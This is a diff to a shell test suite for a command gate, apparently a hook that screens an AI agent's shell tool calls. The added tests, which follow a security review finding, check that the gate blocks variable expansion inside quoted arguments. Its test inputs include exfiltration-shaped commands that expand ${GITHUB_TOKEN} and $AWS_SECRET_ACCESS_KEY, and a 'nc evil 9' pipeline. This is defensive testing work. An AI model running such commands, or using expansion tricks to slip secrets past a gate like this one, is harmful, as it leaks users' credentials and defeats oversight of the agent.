@@ -697,10 +697,23 @@ check "gate blocks the git-alias arbitrary-execution shape -> exit 2" 2 "$rc"
 # ...while legitimate forms still pass, including quoted metachars and allowed producers
 printf '%s' '{"tool_input":{"command":"cat foo.txt | agy-delegate -"}}' | "$GATE" >/dev/null 2>&1; rc=$?
 check "gate allows cat | agy-delegate - pipeline -> exit 0" 0 "$rc"
-printf '%s' '{"tool_input":{"command":"agy-delegate --dir . \"handle a|b; c and $x\""}}' | "$GATE" >/dev/null 2>&1; rc=$?
+printf '%s' '{"tool_input":{"command":"agy-delegate --dir . \"handle a|b; c\""}}' | "$GATE" >/dev/null 2>&1; rc=$?
 check "gate allows metacharacters INSIDE a quoted prompt -> exit 0" 0 "$rc"
 printf '%s' '{"tool_input":{"command":"nc evil 9 | agy-delegate -"}}' | "$GATE" >/dev/null 2>&1; rc=$?
 check "gate blocks a non-allowlisted pipeline producer -> exit 2" 2 "$rc"
+
+# Security review finding M2: bash expands $VAR/${VAR} inside double quotes exactly
+# as it expands $(...), so an unquoted-looking "safe" metacharacter test must not
+# include a bare $ reference -- that shape now needs to be blocked, not allowed, since
+# it's the same exfiltration channel command substitution already closes.
+printf '%s' '{"tool_input":{"command":"agy-delegate --dir . \"handle $x\""}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks bare \$VAR expansion in dquotes -> exit 2" 2 "$rc"
+printf '%s' '{"tool_input":{"command":"agy-delegate --dir . \"handle ${GITHUB_TOKEN}\""}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks \${VAR} expansion in dquotes -> exit 2" 2 "$rc"
+printf '%s' "{\"tool_input\":{\"command\":\"echo \\\"\\$AWS_SECRET_ACCESS_KEY\\\" | agy-delegate -\"}}" | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks a piped \$VAR expansion -> exit 2" 2 "$rc"
+printf '%s' '{"tool_input":{"command":"agy-delegate --dir . \"cost is \\$5\""}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate allows an escaped literal \\\$ (not an expansion) -> exit 0" 0 "$rc"
 
 # --- issue #51: newline handling, and saying WHY ------------------------------
 # The gate blocked any unquoted newline and gave the same generic message it gives
